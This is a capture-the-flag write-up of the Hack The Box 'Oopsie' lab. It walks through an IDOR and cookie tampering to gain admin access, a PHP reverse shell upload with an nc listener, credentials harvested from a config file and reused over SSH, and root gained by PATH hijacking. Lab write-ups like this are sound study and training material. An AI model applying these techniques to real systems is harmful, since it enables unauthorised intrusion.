# [HTB] Oopsie

## recon 
- [namp scan](./nmap.log)
	- p22 & p80 are open

- [gobuster scan](./gobuster.log)
	- found few sub-directories with _forbidden access_

- using burp-suite to crawl site
	- found `/cdn-cgi/login`

## hacking
- here we can see a login page, with _login as guest_ option
	- we are redirected to `/cdn-cgi/login/admin.php`
	- by clicking on _Account_ (on navbar), the url becomes `/admin.php?content=accounts&id=2`
		- here we can see `id` param set to `2`
		- if we set `id=1` (enter), we can see `34322	admin	admin@megacorp.com`
	- after clicking _Uploads_ (on navbar), it says `This action require super admin rights.`
		- there are two cookies: `role` & `user`
			- setting them to `admin` & `34322` resp. gives us access to the page
		- the uploads seems to be `Branding Image Uploads`

- setup & uploaded a _php reverse shell_ (from _Uploads_)
	- starting a listener `nc -lnvp 4444`
	- accessing it thr `http://<IP>/uploads/php-reverse-shell.php` 
		- found `/uploads` from gobuster which is _forbidden_, but files inside seems to work (can be called)
	- __successfully got a reverse shell!!__

- currently we are `www-data` (`whoami`)
	- enumerating system
	- found `/home/robert/user.txt` > `f2c74ee8db7983851ab2a96a44eb7981`
	- found `var/www/html/cdn-cgi/login/db.php` > `<?php $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage'); ?>`
		- got _username_=`robert` & _password_=`M3g4C0rpUs3r!`
			- successfully logged as _robert_ using ssh

- listing available groups `cat /etc/group`
	- `find -group bugtracker 2>/dev/null` > `./usr/bin/bugtracker`
		- `strings bugtracker` > `cat /root/reports/`
		- program executes with root prems
	- program executes the command (found in strings o/p) appended with given input
		- deduced from, if we enter a _number_ we get some error & if string we get something like `cat: /root/reports/test: No such file or directory`
	- to get root shell > `export PATH=/tmp:$PATH` > `cd /tmp` > `echo '/bin/sh' > cat` > `chmod +x cat`  (> `echo $PATH`)
	- now execute `bugtracker` program (& enter any character)
	- __successfully got a root shell!!__
	- found `/root/root.txt` > `af13b0bee69f8a877c3faf667f7beacf`
